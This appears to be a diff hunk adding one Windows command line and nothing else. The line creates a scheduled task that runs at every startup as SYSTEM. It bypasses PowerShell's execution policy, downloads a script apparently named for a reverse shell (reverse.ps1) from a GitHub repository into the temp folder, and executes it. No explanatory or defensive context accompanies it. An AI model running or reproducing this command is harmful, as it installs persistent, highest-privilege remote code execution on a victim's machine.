@@ -1,0 +1,1 @@
+schtasks /create /tn "MyPowerShell" /tr "powershell.exe -ExecutionPolicy Bypass -Command \"curl -o $env:TEMP\\reverse.ps1 https://github.com/Tumelo0321/code25/blob/main/reverse.ps1; powershell.exe -ExecutionPolicy Bypass -File $env:TEMP\\reverse.ps1\"" /sc onstart /ru SYSTEM
